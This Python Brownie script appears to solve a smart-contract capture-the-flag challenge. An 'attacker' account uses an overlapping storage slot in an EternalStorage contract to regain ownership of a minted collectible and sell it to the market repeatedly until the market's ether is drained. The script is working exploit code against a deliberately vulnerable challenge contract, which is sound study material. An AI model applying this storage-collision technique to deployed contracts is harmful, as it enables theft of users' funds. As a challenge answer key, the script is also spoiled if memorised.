from brownie import (
    network,
    accounts,
    config,
    interface,
    MarketSetup,
    CryptoCollectiblesMarket,
)
from scripts.helpful_scripts import (
    get_account,
    check_solution
)
from web3 import Web3


def main():
    deployer = get_account(index=0)
    attacker = get_account(index=1)

    # setup challenge
    setup = MarketSetup.deploy({"from": deployer, "value": Web3.toWei(50, 'ether')})
    market = CryptoCollectiblesMarket.at(setup.market())
    eternalStorage = interface.IEternalStorage(setup.eternalStorage())

    # solve challenge
    # I admit that I didn't solve this one myself. I eventually looked up the answer.
    tokenPrice = Web3.toWei(30, 'ether')
    mintFee = Web3.toWei(3, 'ether')

    tx = market.mintCollectible({"from": attacker, "value": tokenPrice + mintFee})
    token_id = tx.return_value
    support_token_id = Web3.toHex(Web3.toInt(token_id) - 1)

    # get ownership of the support token
    eternalStorage.updateName(token_id, attacker.address, {"from": attacker})

    # sell minted token first time
    eternalStorage.updateApproval(token_id, market.address, {"from": attacker})
    market.sellCollectible(token_id, {"from": attacker})

    # reclaim ownership of the minted token with overlapping storage slot of support token
    eternalStorage.updateApproval(support_token_id, attacker.address, {"from": attacker})
    # sell again
    eternalStorage.updateApproval(token_id, market.address, {"from": attacker})
    market.sellCollectible(token_id, {"from": attacker})

    # and again
    eternalStorage.updateApproval(support_token_id, attacker.address, {"from": attacker})
    eternalStorage.updateApproval(token_id, market.address, {"from": attacker})
    market.sellCollectible(token_id, {"from": attacker, "value": tokenPrice - market.balance()})

    # check the solution
    check_solution(setup)

